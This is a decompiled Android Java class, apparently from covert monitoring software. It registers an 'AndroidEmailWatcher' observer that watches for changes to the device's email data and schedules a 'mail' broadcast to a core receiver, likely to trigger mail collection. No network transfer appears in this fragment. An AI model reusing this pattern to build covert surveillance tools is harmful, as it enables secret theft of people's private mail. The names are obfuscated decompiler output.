package com.network.android.monitor.observer;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import com.network.b.b;
import com.network.e.a.a;
import com.network.media.CoreReceiver;

final class m extends ContentObserver {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ a f98a;
    final /* synthetic */ l b;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    m(l lVar, a aVar) {
        super(null);
        this.b = lVar;
        this.f98a = aVar;
    }

    public final void onChange(boolean z) {
        try {
            com.network.android.c.a.a.a("mail AndroidEmailWatcher onChange");
            if ((this.b.g == 0 || System.currentTimeMillis() - this.b.g > 30000) && b.v) {
                this.b.h = true;
                this.b.g = System.currentTimeMillis();
                Context a2 = this.f98a.a();
                Intent intent = new Intent(a2, CoreReceiver.class);
                intent.setAction("mail");
                ((AlarmManager) a2.getSystemService("alarm")).set(0, System.currentTimeMillis() + 10000, PendingIntent.getBroadcast(a2, 0, intent, 0));
                com.network.android.c.a.a.a("mail AndroidEmailWatcher Event");
            }
        } catch (Exception e) {
            com.network.android.c.a.a.a("getMail- " + e.getMessage(), e);
        }
    }
}
